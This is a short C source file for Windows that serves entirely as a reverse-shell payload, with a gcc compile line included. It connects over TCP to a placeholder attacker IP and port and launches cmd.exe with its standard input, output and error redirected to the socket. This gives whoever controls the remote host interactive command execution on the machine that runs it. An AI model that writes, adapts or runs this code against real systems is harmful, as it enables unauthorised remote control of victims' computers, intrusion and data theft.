#include <winsock2.h>
#include <windows.h>
#include <stdio.h>


//Compile with gcc.exe -o shell.exe shell.c -lws2_32 

char UR_IP_ADDR[] = "Ur_ip";
int UR_PORT = UR_port;




int main(int argc, char const *argv[])
{
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    SOCKET sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(UR_IP_ADDR);
    addr.sin_port = htons(UR_PORT);
    WSAConnect(sock, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL);
    
    
    
    STARTUPINFOA si = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
    PROCESS_INFORMATION pi = { 0 };
    CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    return 0;


    
 }
